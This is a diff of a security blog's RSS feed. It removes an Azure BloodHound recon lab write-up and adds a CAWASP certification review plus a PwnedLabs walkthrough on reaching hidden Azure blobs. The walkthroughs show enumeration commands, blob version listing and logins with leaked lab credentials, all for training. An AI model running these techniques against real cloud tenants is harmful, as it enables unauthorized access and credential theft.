@@ -5,105 +5,207 @@
         <description>Recent content in Posts on [KafkaEsc]</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Wed, 04 Sep 2024 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Sun, 08 Sep 2024 00:00:00 +0000</lastBuildDate>
         <atom:link href="https://kafka-esc.com/posts/index.xml" rel="self" type="application/rss+xml" />
         
         <item>
-            <title>1. Intro to Azure Recon with BloodHound</title>
-            <link>https://kafka-esc.com/posts/2024/09/1.-intro-to-azure-recon-with-bloodhound/</link>
-            <pubDate>Wed, 04 Sep 2024 00:00:00 +0000</pubDate>
+            <title>CAWASP Review</title>
+            <link>https://kafka-esc.com/posts/2024/09/cawasp-review/</link>
+            <pubDate>Sun, 08 Sep 2024 00:00:00 +0000</pubDate>
             
-            <guid>https://kafka-esc.com/posts/2024/09/1.-intro-to-azure-recon-with-bloodhound/</guid>
-            <description>Scenario After discovering that a public company GitHub repository contained accidentally committed credentials, Mega Big Tech has requested us to investigate the extent of potential exposure. They want to determine if these credentials can be used to access their cloud environment and if any confidential data is at risk.
-Azure credentials Password: Bigt3ch123! IAM user: Jose.Rodriguez@megabigtech.com To quote John Lambert, Defenders think in lists. Attackers think in graphs. As long as this is true, attackers win .</description>
-            <content type="html"><![CDATA[<h3 id="scenario">Scenario</h3>
-<p>After discovering that a public company GitHub repository contained accidentally committed credentials, Mega Big Tech has requested us to investigate the extent of potential exposure. They want to determine if these credentials can be used to access their cloud environment and if any confidential data is at risk.</p>
-<h4 id="azure-credentials">Azure credentials</h4>
-<pre tabindex="0"><code>Password: Bigt3ch123! 
-IAM user: Jose.Rodriguez@megabigtech.com
-</code></pre><hr>
-<p>To quote John Lambert, <a href="https://github.com/JohnLaTwC/Shared/blob/master/Defenders%20think%20in%20lists.%20Attackers%20think%20in%20graphs.%20As%20long%20as%20this%20is%20true%2C%20attackers%20win.md">Defenders think in lists. Attackers think in graphs. As long as this is true, attackers win</a> . As defenders, thinking in graphs as an attacker would will allow us to more proactively secure our networks.</p>
-<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>az login -u &lt;email&gt; -p &lt;password&gt; --allow-no-subscriptions
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./azurehound  -u <span style="color:#a3be8c">&#34;Jose.Rodriguez@megabigtech.com&#34;</span> -p <span style="color:#a3be8c">&#39;Bigt3ch123!&#39;</span> list --tenant <span style="color:#a3be8c">&#34;2590ccef-687d-493b-ae8d-441cbab63a72&#34;</span> -o output.json
-</span></span></code></pre></div><p><img src="/img/archive/Pasted%20image%2020240904194244.png" alt=""></p>
-<h3 id="bloudhound">Bloudhound</h3>
-<p><img src="/img/archive/Pasted%20image%2020240904194850.png" alt=""></p>
+            <guid>https://kafka-esc.com/posts/2024/09/cawasp-review/</guid>
+            <description>The market for cloud computing continues to grow worldwide, businesses are increasingly adopting theses solutions as they are affordable, flexible and scalable.
+As security professionals, we have to keep up with the transformations of information technology. I didn&amp;rsquo;t want this to be a knowledge gap for me. So I decided I would learn about Azure security. The question is: Where do I start? (Spoiler alert: It&amp;rsquo;s not by reading Microsoft&amp;rsquo;s documentation).</description>
+            <content type="html"><![CDATA[<p>The market for cloud computing continues to grow worldwide, businesses are increasingly adopting theses solutions as they are affordable, flexible and scalable.<br>
+As security professionals, we have to keep up with the transformations of information technology. I didn&rsquo;t want this to be a knowledge gap for me. So I decided I would learn about Azure security. The question is: Where do I start? (<em>Spoiler alert:</em> It&rsquo;s not by reading Microsoft&rsquo;s documentation).</p>
+<p>My options were either a Microsoft&rsquo;s certification, like AZ-500, which I don&rsquo;t like because the exam is multiple choice and I prefer to learn hands-on. I also looked at <a href="https://www.antisyphontraining.com/on-demand-courses/breaching-the-cloud-w-beau-bullock/">Breaching the Cloud by Beau Bullock</a> and <a href="https://training.xintra.org/attacking-and-defending-azure-m365">Attacking and Defending Azure &amp; M365 by Xintra</a>, which seem to have great content, but are a bit expensive and don&rsquo;t include a practical exam that demonstrate the acquired expertise, maybe I&rsquo;ll consider enrolling in the future. That left me with <a href="https://cloudbreach.io/">Cloud Breach</a> and <a href="https://www.alteredsecurity.com">Altered Security</a>. I chose the latter option because my friends who had already enrolled in some of their courses gave positive feedback about the labs.</p>
+<p><img src="/img/archive/06veesnn.png" alt=""></p>
+<h2 id="what-is-cawasp">What is CAWASP?</h2>
+<p><a href="https://www.alteredsecurity.com">Altered Security</a> currently has 3 cloud based certifications:</p>
 <ul>
-<li><strong>UPDATE MANAGER</strong>: This is a custom directory role. On clicking the role we see the description &ldquo;Allows helpdesk staff to update the manager role when users change teams&rdquo;. This doesn&rsquo;t seem too interesting from a security perspective.</li>
-<li><strong>DIRECTORY READERS</strong>: This directory role that allows users to read basic directory information, excluding sensitive data values.</li>
-<li><strong>PRINTER TECHNICIAN</strong>: This role allows users to register and unregister printers and update printer status. In our current scenario this also doesn&rsquo;t seem too interesting from a security perspective.</li>
-<li><strong>ATTRIBUTE DEFINITION READER</strong>: This is a new directory role that allows members to read the definition of custom security attributes.</li>
-<li><strong>ATTRIBUTE ASSIGNMENT READER</strong>: This is a new directory role that allows members to read custom security attribute keys and values for supported Microsoft Entra objects.</li>
+<li><a href="https://www.alteredsecurity.com/azureappsec">Certified Azure Web Application Security Professional (CAWASP)</a></li>
+<li><a href="https://www.alteredsecurity.com/azureadlab">Certified Azure Red Team Professional (CARTP)</a></li>
+<li><a href="https://www.alteredsecurity.com/azureadvanced">Certified Azure Red Team Expert (CARTE)</a>.</li>
 </ul>
-<h4 id="custom-queries">Custom Queries</h4>
-<p><strong>Return all users with &lsquo;Global Administrator&rsquo; Role</strong></p>
-<pre tabindex="0"><code class="language-cypher" data-lang="cypher">MATCH p =(n)-[r:AZGlobalAdmin*1..]-&gt;(m) RETURN p
-</code></pre><h3 id="look-for-custom-security-attributes">Look for Custom Security Attributes</h3>
-<p>Dumps every user:</p>
-<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"># Connect to Microsoft Graph</span>
-</span></span><span style="display:flex;"><span><span style="color:#81a1c1">Connect-MgGraph</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"># Retrieve all users</span>
-</span></span><span style="display:flex;"><span>$allUsers <span style="color:#eceff4">=</span> <span style="color:#81a1c1">Get-MgUser</span> -All
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"># Loop through all users and retrieve their custom security attributes</span>
-</span></span><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">foreach</span> <span style="color:#eceff4">(</span>$user <span style="color:#81a1c1;font-weight:bold">in</span> $allUsers<span style="color:#eceff4">)</span> <span style="color:#eceff4">{</span>
-</span></span><span style="display:flex;"><span>    $userAttributes <span style="color:#eceff4">=</span> <span style="color:#81a1c1">Get-MgUser</span> -UserId $user<span style="color:#eceff4">.</span><span style="color:#8fbcbb">Id</span> -Property <span style="color:#a3be8c">&#34;customSecurityAttributes&#34;</span>
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#616e87;font-style:italic"># Display the additional properties of custom security attributes for each user</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1">Write-Host</span> <span style="color:#a3be8c">&#34;User: </span><span style="color:#eceff4">$(</span>$user<span style="color:#eceff4">.</span>UserPrincipalName<span style="color:#eceff4">)</span><span style="color:#a3be8c">&#34;</span>
-</span></span><span style="display:flex;"><span>    $userAttributes<span style="color:#eceff4">.</span><span style="color:#8fbcbb">CustomSecurityAttributes</span><span style="color:#eceff4">.</span><span style="color:#8fbcbb">AdditionalProperties</span> <span style="color:#eceff4">|</span> <span style="color:#81a1c1">Format-List</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1">Write-Host</span> <span style="color:#a3be8c">&#34;---------------------------------------------&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#eceff4">}</span>
-</span></span></code></pre></div><p>Only returns the users that have a security attribute:</p>
-<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"># Connect to Microsoft Graph</span>
-</span></span><span style="display:flex;"><span><span style="color:#81a1c1">Connect-MgGraph</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"># Retrieve all users</span>
-</span></span><span style="display:flex;"><span>$allUsers <span style="color:#eceff4">=</span> <span style="color:#81a1c1">Get-MgUser</span> -All
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic"># Loop through all users and retrieve their custom security attributes</span>
-</span></span><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">foreach</span> <span style="color:#eceff4">(</span>$user <span style="color:#81a1c1;font-weight:bold">in</span> $allUsers<span style="color:#eceff4">)</span> <span style="color:#eceff4">{</span>
-</span></span><span style="display:flex;"><span>    $userAttributes <span style="color:#eceff4">=</span> <span style="color:#81a1c1">Get-MgUser</span> -UserId $user<span style="color:#eceff4">.</span><span style="color:#8fbcbb">Id</span> -Property <span style="color:#a3be8c">&#34;customSecurityAttributes&#34;</span>
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#616e87;font-style:italic"># Display the additional properties of custom security attributes for each user</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">if</span> <span style="color:#eceff4">(</span>$userAttributes<span style="color:#eceff4">.</span><span style="color:#8fbcbb">CustomSecurityAttributes</span><span style="color:#eceff4">.</span><span style="color:#8fbcbb">AdditionalProperties</span><span style="color:#eceff4">.</span><span style="color:#8fbcbb">Count</span> <span style="color:#81a1c1">-gt</span> <span style="color:#b48ead">0</span><span style="color:#eceff4">)</span> <span style="color:#eceff4">{</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1">Write-Host</span> <span style="color:#a3be8c">&#34;User: </span><span style="color:#eceff4">$(</span>$user<span style="color:#eceff4">.</span>UserPrincipalName<span style="color:#eceff4">)</span><span style="color:#a3be8c">&#34;</span>
-</span></span><span style="display:flex;"><span>    $userAttributes<span style="color:#eceff4">.</span><span style="color:#8fbcbb">CustomSecurityAttributes</span><span style="color:#eceff4">.</span><span style="color:#8fbcbb">AdditionalProperties</span> <span style="color:#eceff4">|</span> <span style="color:#81a1c1">Format-List</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1">Write-Host</span> <span style="color:#a3be8c">&#34;---------------------------------------------&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#eceff4">}</span>
-</span></span><span style="display:flex;"><span><span style="color:#eceff4">}</span>
-</span></span></code></pre></div><p><img src="/img/archive/Pasted%20image%2020240904210427.png" alt=""></p>
-<pre tabindex="0"><code>archive@megabigtech.com
-D4taS3cur1ty!!
-</code></pre><p>After logging into to the <a href="https://portal.azure.com/">Azure Portal</a> we can check the user in the console. We see that Helpdesk staff added the attribute to allow them to login and troubleshoot as this user.</p>
-<p><img src="/img/archive/Pasted%20image%2020240904211420.png" alt=""></p>
-<p>Let&rsquo;s now turn our attention to aspects that BloodHound may have missed. It&rsquo;s worth noting that although BloodHound does a great job at finding the directory roles, a current blind-spot in this tool is Azure role assignments that are assigned at a subscription, management group, resource group or individual resource level.</p>
-<p><img src="/img/archive/Pasted%20image%2020240904212035.png" alt=""></p>
-<p><strong>Checking Role Assignments</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Get-AzRoleAssignment</span>
-</span></span></code></pre></div><p><img src="/img/archive/Pasted%20image%2020240904212239.png" alt=""></p>
-<p><img src="/img/archive/Pasted%20image%2020240904212420.png" alt=""></p>
-<p>Extracted:</p>
-<pre tabindex="0"><code># Credentials: User: security-user | Password: Imp0sec0sT!
-az storage blob download --account-name securityconfigs --container-name security-pc --name config-latest.xml --auth-mode login
-</code></pre><p><img src="/img/archive/Pasted%20image%2020240904212811.png" alt=""></p>
-<h3 id="enumerate-vm">Enumerate VM</h3>
-<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Get-AzVM</span> -ResourceGroupName <span style="color:#a3be8c">&#34;content-static-2&#34;</span> -Name <span style="color:#a3be8c">&#34;SECURITY-PC&#34;</span>  -UserData
-</span></span></code></pre></div><p><img src="/img/archive/Pasted%20image%2020240904213720.png" alt=""></p>
-<p><img src="/img/archive/Pasted%20image%2020240904213739.png" alt=""></p>
-<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>az login -u security-user@megabigtech.com -p <span style="color:#a3be8c">&#39;Imp0sec0sT!&#39;</span> --allow-no-subscriptions
-</span></span><span style="display:flex;"><span>az storage blob download --account-name securityconfigs --container-name security-pc --name config-latest.xml --auth-mode login <span style="color:#eceff4">|</span> xq
-</span></span></code></pre></div><p><img src="/img/archive/Pasted%20image%2020240904214148.png" alt=""></p>
-<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#81a1c1">&lt;GlobalAdmin&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1">&lt;Username&gt;</span>ryan@megabigtech.com<span style="color:#81a1c1">&lt;/Username&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1">&lt;Password&gt;</span>AzureAdmin12345!<span style="color:#81a1c1">&lt;/Password&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1">&lt;Email&gt;</span>ryan@megabigtech.com<span style="color:#81a1c1">&lt;/Email&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1">&lt;TwoFactorAuthentication&gt;</span>Enabled<span style="color:#81a1c1">&lt;/TwoFactorAuthentication&gt;</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#81a1c1">&lt;/GlobalAdmin&gt;</span>
-</span></span></code></pre></div><p><img src="/img/archive/Pasted%20image%2020240904214816.png" alt=""></p>
-<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>az storage blob download --account-name securityconfigs --container-name security-pc -n flag.txt --auth-mode login
-</span></span></code></pre></div><p><img src="/img/archive/Pasted%20image%2020240904215721.png" alt=""></p>
+<p>The <strong>CARTP</strong> focuses more on red teaming: getting initial access, moving laterally and escalation of privileges within Azure Entra ID. On the other hand, <strong>CAWASP</strong> is more focused on the exploitation of Azure services integrated in web applications, like app registrations, function apps, key vaults, storage accounts, databases etc. Finally, for those with more experience, there&rsquo;s <strong>CARTE</strong>, which consolidates everything into one package and adds a layer of evasion of top of it.</p>
+<p>My current job role involves a lot of web application testing, so i thought the <strong>CAWASP</strong> certification would be more appropriate and have further carry over to my day-to-day functions.</p>
+<p>In this course you&rsquo;ll get a very good overview of the most common Azure Services.</p>
+<p>You&rsquo;ll learn:</p>
+<ul>
+<li><strong>Applications Services</strong>
+<ul>
+<li>App Services</li>
+<li>Function Apps</li>
+<li>API Management</li>
+</ul>
+</li>
+<li><strong>Identity Services for Applications</strong>
+<ul>
+<li>App Registrations</li>
+<li>Enterprise Apps</li>
+</ul>
+</li>
+<li><strong>Access Control</strong>
+<ul>
+<li>RBAC (Azure role-based access controls)</li>
+<li>ABAC (Attribute Based Access Control)</li>
+<li>Conditional Access Policies</li>
+</ul>
+</li>
+<li><strong>Authentication and Authorization</strong>
+<ul>
+<li>OAuth and OIDC</li>
+</ul>
+</li>
+<li><strong>Storage</strong>
+<ul>
+<li>Containers</li>
+<li>Blobs</li>
+<li>Files Shares</li>
+<li>Tables</li>
+</ul>
+</li>
+<li><strong>Databases</strong>
+<ul>
+<li>CosmosDB</li>
+<li>Azure SQL</li>
+</ul>
+</li>
+<li><strong>WAF</strong></li>
+<li><strong>Microsoft Graph API</strong></li>
+<li><strong>Microsoft Defender for Cloud</strong></li>
+</ul>
+<h2 id="pricing--material">Pricing &amp; Material</h2>
+<p>There are 3 purchase options for CAWASP: 30, 60 and 90 days lab access. These go for $299, $449 and  $699, respectively. The materials you get is the same with these options, the only thing that changes is the lab access period.</p>
+<p><strong>The materials include:</strong></p>
+<ul>
+<li><strong>Video tutorials</strong> featuring Chirag Savla, where he explains and demonstrates the concepts</li>
+<li><strong>Slides</strong> form the videos in PDF</li>
+<li>PowerShell <strong>code snippets</strong> used throughout the videos</li>
+<li>And most importantly, access to <strong>hands-on labs</strong> where you can practice what you&rsquo;ve learned</li>
+</ul>
+<h2 id="course-review">Course Review</h2>
+<p>Chirag Savla starts the course by providing an overview of Azure fundamentals. From there he delves deeper into every concept, providing clear explanations on how each component works. After that, he demonstrates the exploitation of each service and how you can combine those vulnerabilities to achieve greater impact.<br>
+I think it&rsquo;s important to note that Chirag has a very strong accent, which may make his explanations hard to understand, but you&rsquo;ll have the course slides that you can review.<br>
+He&rsquo;ll teach you how to do reconnaissance to discover Azure services, get initial access on a web application, further enumerate Azure components, move laterally and escalate privileges.</p>
+<p>In my opinion, the initial foothold for the web applications in the demos was overly simplistic and unrealistic. The LFI, SSTI and file uploads RCE were fine, but the command injections were out of control.  A command injection in a search functionality, really? Somebody was programming with a 🔨.<br>
+However, the focus of the course is not web application testing, it&rsquo;s Azure security, so I don&rsquo;t think it&rsquo;s a big deal.</p>
+<p>The course syllabus states that you don&rsquo;t need any prior knowledge of Azure, and you don&rsquo;t. Nonetheless, I would still recommend you to learn some Azure basic concepts and a bit of powershell. John Savill has a very comprehensive Youtube channel where he explains Azure concepts. You can check this <a href="https://www.youtube.com/playlist?list=PLlVtbbG169nED0_vMEniWBQjSoxTsBYS3">playlist</a> for the Azure fundamentals and this <a href="https://www.youtube.com/playlist?list=PLlVtbbG169nFq_hR7FcMYg32xsSAObuq8">playlist</a> for the powershell basics.</p>
+<h3 id="labs">Labs</h3>
+<p>For the Lab access you receive an OpenVPN configuration file and credentials for a Windows Virtual Machine that is deployed for you and has access to the Azure environment. You&rsquo;ll have access to the <strong>Attack Labs</strong>, which is an environment with 2 attack chains that are showcased in the course, and also to the <strong>Practice Labs</strong>, where you can deploy separate challenges that are demonstrated in the videos as well. This VM will have every tool needed to complete these challenges.</p>
+<p>Personally I felt the connection to the VM was a bit slow, probably due to my screen resolution. You can always use your own VM and connect directly to the VPN.</p>
+<p>To make a VPN full tunnel, you just need to add this line to the OpenVPN config file:</p>
+<pre tabindex="0"><code>redirect-gateway def1
+</code></pre><p>I had 2 issues with the labs. One of the <strong>Practice Labs</strong> challenge had a deployment problem and I was never able to complete it. The other issue was in the <strong>Attack Labs</strong>, where one configuration file had outdated credentials. This problem was quickly solved by contacting their support in the discord channel.</p>
+<p>Apart from that, the labs were good and the environment architecture was well designed. The service misconfigurations in the <strong>Attack Labs</strong> were realist and fun to exploit.<br>
+The 30 days of lab access package was enough for me, but I really immersed myself during that month and spent as much time as I could in the labs. If you are a very busy person, might be better to consider the 60 day package.</p>
+<h3 id="exam">Exam</h3>
+<p>The exam consists of a 24 hour challenge in which you have to compromise Azure services and get the final flag. After that, you have 48 hours to write a comprehensive report detailing every step. You can re-launch the exam lab and your exam VM. The VM comes completely vanilla, with nothing installed, so if you reset the lab, all the tools you have installed will ride off into the sunset.</p>
+<p>For the most part, the Exam is pretty straight forwarded, there are no rabbit holes. However, I had problems with a minor but fulcral detail that is not taught in the course and is needed to pass the exam. Maybe it&rsquo;s Altered&rsquo;s way of testing your research capabilities.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>This certification was a lot of fun. For the price, the value you get in this course is hard to beat. Azure is a whole new world of features that are super fun to exploit. Moreover, you&rsquo;re learning how to abuse features, that means they are not patchable and will reappear again and again.</p>
+<p>I tried to explore every attack vector in different ways and with different tools. I recommend you to do the same. Research to find some tools and put them in action in the labs. Try do it from Windows and from Linux. If something doesn&rsquo;t work, troubleshoot it, figure out why and find a solution. That&rsquo;s how I learn.</p>
+<p>If you&rsquo;re looking to get started with Azure and want to learn about real life attack vectors from the web application side of things, I&rsquo;d definitely recommend giving this course a try.</p>
+<p>You can get it from <a href="https://www.alteredsecurity.com/azureappsec">here</a>.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>PwnedLabs - Azure Blob Container to Initial Access</title>
+            <link>https://kafka-esc.com/posts/2024/09/pwnedlabs-azure-blob-container-to-initial-access/</link>
+            <pubDate>Sun, 01 Sep 2024 00:00:00 +0000</pubDate>
+            
+            <guid>https://kafka-esc.com/posts/2024/09/pwnedlabs-azure-blob-container-to-initial-access/</guid>
+            <description>Lab: https://pwnedlabs.io/labs/azure-blob-container-to-initial-access
+Scenario Mega Big Tech have adopted a hybrid cloud architecture and continues to use a local on-premise Active Directory domain, as well as the Azure cloud. They are wary of being targeted due to their importance in the tech world, and have asked your team to assess the security of their infrastructure, including cloud services. An interesting URL has been found in some public documentation, and you are tasked with assessing it.</description>
+            <content type="html"><![CDATA[<p>Lab: <a href="https://pwnedlabs.io/labs/azure-blob-container-to-initial-access">https://pwnedlabs.io/labs/azure-blob-container-to-initial-access</a></p>
+<h3 id="scenario">Scenario</h3>
+<p>Mega Big Tech have adopted a hybrid cloud architecture and continues to use a local on-premise Active Directory domain, as well as the Azure cloud. They are wary of being targeted due to their importance in the tech world, and have asked your team to assess the security of their infrastructure, including cloud services. An interesting URL has been found in some public documentation, and you are tasked with assessing it.</p>
+<p><strong>URL:</strong> <code>https://mbtwebsite.blob.core.windows.net/$web/index.html</code></p>
+<hr>
+<h2 id="enumerate-domain-name">Enumerate domain name</h2>
+<p>Let&rsquo;s start our enumeration on the domain <code>megabigtech.com</code>. I&rsquo;ll be using <a href="https://github.com/Gerenios/AADInternals">AADInternals</a> for this. If you have never used it, go ahead and install it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Install-Module</span> -Name AADInternals -Force -scope currentuser
+</span></span></code></pre></div><p>We can use the <code>Invoke-AADIntReconAsOutsider</code> module to enumerate the domain. If you have no idea how to use a certain module in powershell, you can always use the <code>Get-Help</code> cmdlet.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Get-Help</span> -Name <span style="color:#81a1c1">Invoke-AADIntReconAsOutsider</span> -Examples
+</span></span></code></pre></div><p><img src="/img/archive/Pasted%20image%2020240909212751.png" alt=""></p>
+<p>Let&rsquo;s use the first example on our target domain.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Invoke-AADIntReconAsOutsider</span> -DomainName megabigtech<span style="color:#eceff4">.</span><span style="color:#8fbcbb">com</span> <span style="color:#eceff4">|</span> <span style="color:#81a1c1">Format-Table</span>
+</span></span></code></pre></div><p><img src="/img/archive/Pasted%20image%2020240815160609.png" alt=""></p>
+<p>This domain is associated with a tenant, that indicates that is being hosted in Azure.</p>
+<blockquote>
+<p><strong>Troubleshoot</strong></p>
+<p>The <code>Resolve-DnsName</code> cmdlet is windows only. However, as you can see from the screenshots, I&rsquo;m using <code>pwsh</code> for linux. There is a port of <code>Resolve-DnsName</code> for linux that you can install:<br>
+<a href="https://github.com/rhymeswithmogul/Resolve-DnsNameCrossPlatform">https://github.com/rhymeswithmogul/Resolve-DnsNameCrossPlatform</a></p>
+<p>After installing, you&rsquo;ll want to remove every instance of the <code>-NoHostsFile</code> flag used in <strong>AADInternals</strong>, as that flag is not supported by the port and will print out some errors.</p>
+</blockquote>
+<h3 id="now-for-the-webapp-enumeration">Now for the Webapp enumeration</h3>
+<p>Check for DNS records with our newly installed tool.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Resolve-DnsName</span> dev<span style="color:#eceff4">.</span><span style="color:#8fbcbb">megabigtech</span><span style="color:#eceff4">.</span><span style="color:#8fbcbb">com</span>
+</span></span></code></pre></div><p><img src="/img/archive/Pasted%20image%2020240815175435.png" alt=""></p>
+<p>There is a <strong>CNAME</strong> record pointing to <code>mbtwebsite.blob.core.windows.net</code>, which is a blob URL. A blob URL will always have this structure <code>https://&lt;storageAccountName&gt;.blob.core.windows.net</code>.</p>
+<p>So we can conclude that this webapp is being served in a blob container called <code>$web</code>.</p>
+<p><img src="/img/archive/Pasted%20image%2020240815175819.png" alt=""></p>
+<h2 id="enumerating-the-blob">Enumerating the blob</h2>
+<p>We are going to enumerate the blob manually, but first I&rsquo;d like to show you the automated way with <a href="">AzSubEnum</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 azsubenum.py -b mbtwebsite -t <span style="color:#b48ead">10</span> -p permutations.txt --blobsenum -bt <span style="color:#b48ead">10</span>
+</span></span></code></pre></div><p>Flags:</p>
+<blockquote>
+<p><code> -b BASE (storage account name)</code><br>
+<code>-t Threads</code><br>
+<code>-p Permutations file for storage account</code><br>
+<code>--blobsenum (flag to enumerate blobs)</code><br>
+<code>-bw Blob Wordlist (default is permutations file)</code><br>
+<code>-bt Blob Threads</code></p>
+</blockquote>
+<p><img src="/img/archive/Pasted%20image%2020240909215523.png" alt=""></p>
+<p>Thanks to <a href="">Priest</a>, this tool is now able to enumerate blobs as well and will print out their path. It also generates an <code>.html</code> file for better navigation or if you want to include the results in a report.</p>
+<h3 id="manual-enumeration">Manual enumeration</h3>
+<p>To check if the file is being served in a blob, you can make a request to it and see the headers it returns.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Invoke-WebRequest</span> -Uri <span style="color:#a3be8c">&#39;https://mbtwebsite.blob.core.windows.net/$web/index.html&#39;</span> -Method Head
+</span></span></code></pre></div><p>In this case, we see the <code>x-ms-blob-type: BlockBlob</code> header in the response, confirming it is indeed a blob.</p>
+<h4 id="listing-the-blob-container">Listing the Blob Container:</h4>
+<p>To list a Blob Container, you can add the following parameters to the request: <code>?restype=container&amp;comp=list</code>.</p>
+<pre tabindex="0"><code>https://mbtwebsite.blob.core.windows.net/$web?restype=container&amp;comp=list&amp;delimiter=%2F
+</code></pre><p><img src="/img/archive/Pasted%20image%2020240815180832.png" alt=""></p>
+<blockquote>
+<p>The <code>delimiter</code> parameter is to filter blobs that have a <code>/</code>.</p>
+</blockquote>
+<p>As you can see, nothing really interesting, only the <code>static/</code> prefix. We are not stopping here, there is more stuff we can try.</p>
+<h4 id="including-versions">Including <code>versions</code></h4>
+<p>The <code>include=versions</code> parameter can be used to list the version of the blobs and some metadata. This will disclose every  blob in this container alongside with it&rsquo;s version (which we don&rsquo;t really care, we just want the file name).</p>
+<p>To use this parameter, we also have to include the header <code>x-ms-version</code>.</p>
+<p><strong>Using BurpSuite for this:</strong></p>
+<p><img src="/img/archive/Pasted%20image%2020240815172741.png" alt=""></p>
+<p><img src="/img/archive/Pasted%20image%2020240815172622.png" alt=""></p>
+<p>Some files are now appearing that weren&rsquo;t showing before! That <code>scripts-transfer.zip</code> is especially interesting.</p>
+<h4 id="downloading-the-blob">Downloading the Blob</h4>
+<p>Requesting the blob with the correct <code>versionId</code>:</p>
+<p>Copy the <strong>VersionId</strong> that was included in the response for the file that we want to fetch and add it in the <code>versionId</code> parameter.</p>
+<p><img src="/img/archive/Pasted%20image%2020240815173404.png" alt=""></p>
+<p>Download the zip and extract it:</p>
+<p><img src="/img/archive/Pasted%20image%2020240815173602.png" alt=""></p>
+<p>Powershell files are always a good sign. Let&rsquo;s see their contents:</p>
+<p><img src="/img/archive/Pasted%20image%2020240815173705.png" alt=""></p>
+<p><strong>And we find hard-coded credentials!</strong></p>
+<pre tabindex="0"><code>marcus@megabigtech.com
+TheEagles12345!
+</code></pre><p><img src="/img/archive/Pasted%20image%2020240815173903.png" alt=""></p>
+<pre tabindex="0"><code>marcus_adm
+MegaBigTech123!
